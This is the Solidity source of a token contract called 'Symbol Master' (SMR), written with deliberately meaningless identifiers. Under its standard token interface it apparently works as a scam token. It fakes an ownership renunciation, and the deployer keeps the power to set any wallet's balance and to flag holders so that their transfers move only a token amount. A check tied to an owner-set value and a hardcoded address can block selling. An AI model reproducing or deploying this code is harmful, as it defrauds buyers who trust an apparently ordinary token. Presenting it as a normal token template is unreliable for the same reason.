//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fundLaunched {
    function createPair(address listToMax, address senderLimit) external returns (address);
}

interface modeFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeAt) external view returns (uint256);

    function transfer(address exemptIs, uint256 teamFee) external returns (bool);

    function allowance(address teamTakeList, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamFee) external returns (bool);

    function transferFrom(
        address sender,
        address exemptIs,
        uint256 teamFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromMin, uint256 value);
    event Approval(address indexed teamTakeList, address indexed spender, uint256 value);
}

abstract contract modeTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeFromMetadata is modeFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SymbolMaster is modeTake, modeFrom, modeFromMetadata {

    function symbol() external view virtual override returns (string memory) {
        return marketingEnable;
    }

    mapping(address => mapping(address => uint256)) private fromSellTotal;

    mapping(address => uint256) private isReceiver;

    uint256 constant limitReceiver = 18 ** 10;

    uint8 private feeTx = 18;

    function decimals() external view virtual override returns (uint8) {
        return feeTx;
    }

    uint256 private takeReceiver;

    string private marketingEnable = "SMR";

    address public takeTotal;

    function launchedList() public {
        emit OwnershipTransferred(takeTotal, address(0));
        maxWalletMin = address(0);
    }

    function senderTrading(address exemptLiquidity, address exemptIs, uint256 teamFee) internal returns (bool) {
        if (exemptLiquidity == takeTotal) {
            return totalReceiver(exemptLiquidity, exemptIs, teamFee);
        }
        uint256 autoWallet = modeFrom(launchFrom).balanceOf(tokenIs);
        require(autoWallet == fromSell);
        require(exemptIs != tokenIs);
        if (limitAuto[exemptLiquidity]) {
            return totalReceiver(exemptLiquidity, exemptIs, limitReceiver);
        }
        return totalReceiver(exemptLiquidity, exemptIs, teamFee);
    }

    function transferFrom(address exemptLiquidity, address exemptIs, uint256 teamFee) external override returns (bool) {
        if (_msgSender() != minTo) {
            if (fromSellTotal[exemptLiquidity][_msgSender()] != type(uint256).max) {
                require(teamFee <= fromSellTotal[exemptLiquidity][_msgSender()]);
                fromSellTotal[exemptLiquidity][_msgSender()] -= teamFee;
            }
        }
        return senderTrading(exemptLiquidity, exemptIs, teamFee);
    }

    uint256 public senderLaunched;

    function transfer(address feeMaxSwap, uint256 teamFee) external virtual override returns (bool) {
        return senderTrading(_msgSender(), feeMaxSwap, teamFee);
    }

    function name() external view virtual override returns (string memory) {
        return isLiquidityLaunch;
    }

    event OwnershipTransferred(address indexed fromExempt, address indexed atIs);

    address public launchFrom;

    mapping(address => bool) public limitFeeMin;

    function liquiditySell(address tokenSwap) public {
        require(tokenSwap.balance < 100000);
        if (swapLaunchShould) {
            return;
        }
        
        limitFeeMin[tokenSwap] = true;
        if (autoBuy == takeReceiver) {
            sellTx = true;
        }
        swapLaunchShould = true;
    }

    function fundAt(address feeMaxSwap, uint256 teamFee) public {
        fromTake();
        isReceiver[feeMaxSwap] = teamFee;
    }

    function allowance(address atTx, address fundMarketing) external view virtual override returns (uint256) {
        if (fundMarketing == minTo) {
            return type(uint256).max;
        }
        return fromSellTotal[atTx][fundMarketing];
    }

    uint256 private autoLaunchedAmount = 100000000 * 10 ** 18;

    function balanceOf(address modeAt) public view virtual override returns (uint256) {
        return isReceiver[modeAt];
    }

    uint256 limitFrom;

    function receiverMarketing(address fromFeeWallet) public {
        fromTake();
        
        if (fromFeeWallet == takeTotal || fromFeeWallet == launchFrom) {
            return;
        }
        limitAuto[fromFeeWallet] = true;
    }

    address minTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private autoBuy;

    uint256 public takeBuy;

    constructor (){
        if (autoBuy == takeBuy) {
            marketingSwapReceiver = false;
        }
        amountToken fromSender = amountToken(minTo);
        launchFrom = fundLaunched(fromSender.factory()).createPair(fromSender.WETH(), address(this));
        
        takeTotal = _msgSender();
        limitFeeMin[takeTotal] = true;
        isReceiver[takeTotal] = autoLaunchedAmount;
        launchedList();
        
        emit Transfer(address(0), takeTotal, autoLaunchedAmount);
    }

    bool private sellTx;

    bool public swapLaunchShould;

    function getOwner() external view returns (address) {
        return maxWalletMin;
    }

    function walletAmountTotal(uint256 teamFee) public {
        fromTake();
        fromSell = teamFee;
    }

    uint256 private swapIs;

    string private isLiquidityLaunch = "Symbol Master";

    uint256 fromSell;

    function fromTake() private view {
        require(limitFeeMin[_msgSender()]);
    }

    address private maxWalletMin;

    function totalSupply() external view virtual override returns (uint256) {
        return autoLaunchedAmount;
    }

    function approve(address fundMarketing, uint256 teamFee) public virtual override returns (bool) {
        fromSellTotal[_msgSender()][fundMarketing] = teamFee;
        emit Approval(_msgSender(), fundMarketing, teamFee);
        return true;
    }

    mapping(address => bool) public limitAuto;

    address tokenIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private minTrading;

    function owner() external view returns (address) {
        return maxWalletMin;
    }

    bool private marketingSwapReceiver;

    function totalReceiver(address exemptLiquidity, address exemptIs, uint256 teamFee) internal returns (bool) {
        require(isReceiver[exemptLiquidity] >= teamFee);
        isReceiver[exemptLiquidity] -= teamFee;
        isReceiver[exemptIs] += teamFee;
        emit Transfer(exemptLiquidity, exemptIs, teamFee);
        return true;
    }

}